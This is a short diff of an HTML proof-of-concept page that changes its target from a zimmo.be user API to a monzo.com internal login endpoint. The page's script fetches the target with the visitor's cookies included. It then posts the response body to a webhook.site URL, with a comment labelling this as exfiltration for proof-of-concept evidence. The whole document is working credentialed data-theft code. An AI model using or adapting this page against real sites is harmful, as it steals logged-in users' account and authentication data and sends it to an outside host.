@@ -9,7 +9,7 @@
     <pre id="output">Running request...</pre>
 
     <script>
-      fetch("https://user-api.zimmo.be/users/me", {
+      fetch("https://login.internal.monzo.com/idp/idx/challenge/answer", {
         method: "GET",
         credentials: "include",
       })
@@ -19,7 +19,7 @@
         .then(function (data) {
           document.getElementById("output").innerText = data;
           // exfil to webhook for PoC evidence
-          fetch("https://webhook.site/41e326b8-ca14-4950-a11e-2dd349390ce7", {
+          fetch("https://webhook.site/83bf883f-613b-41b3-a884-9012ec7c4a33", {
             method: "POST",
             headers: { "Content-Type": "text/plain" },
             body: data,
